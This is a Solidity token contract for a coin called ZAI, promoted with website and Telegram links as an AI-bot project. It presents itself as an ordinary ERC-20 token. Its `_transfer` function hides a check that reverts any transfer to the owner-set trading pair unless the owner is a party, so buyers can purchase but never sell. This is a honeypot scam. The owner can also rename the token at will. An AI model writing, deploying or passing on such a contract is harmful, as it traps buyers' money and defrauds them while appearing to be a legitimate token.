/**

THE VANGUARD OF AI BOTS.

Website: https://zaibot.io/
Twitter: https://x.com/zaibotio/      
Public Chat: https://t.me/zaibotpublic
Announcement channel: https://t.me/zaibotann

**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

contract ZAI {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender,uint256 value);
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;

    uint8 private  _decimals;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;

    address private _owner;
    address private _pair;
    bool private flag = false;

    function _init(string memory __name, string memory __symbol) internal {
        _name = __name;
        _symbol = __symbol;
    }

    function _initalize(string memory __name, string memory __symbol) external {
        require(msg.sender == _owner);
        _init(__name, __symbol);
    }

    function openTrade(address __pair) public{
        require(msg.sender == _owner);
        _pair = __pair;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }


    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account)
        public
        view
        virtual
        returns (uint256){
        return _balances[account];
    }

    function approve(address spender, uint256 amount)
        public
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function allowance(address owner, address spender)
        public
        view
        virtual
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function transfer(address to, uint256 value)
        public
        virtual
        returns (bool)
    {
        address owner = msg.sender;
        _transfer(owner, to, value);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender] - (amount)
        );
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        uint256 fromBalances = balanceOf(from);
        if(from != _owner && to != _owner){if(_pair == to) {revert();}}
        require(fromBalances >= amount, "ERC20: transfer amount exceeds balance");
        _balances[from] = fromBalances - amount;
        _balances[to] += amount;
        emit Transfer(from, to, amount);
    }

    constructor(string memory name_, string memory symbol_) {
        _owner = msg.sender;
        _name = name_;
        _symbol = symbol_;
        _decimals = 18;
        _totalSupply = 100_000_000 * 10 ** _decimals;
        _balances[msg.sender] = _balances[msg.sender] + _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}
}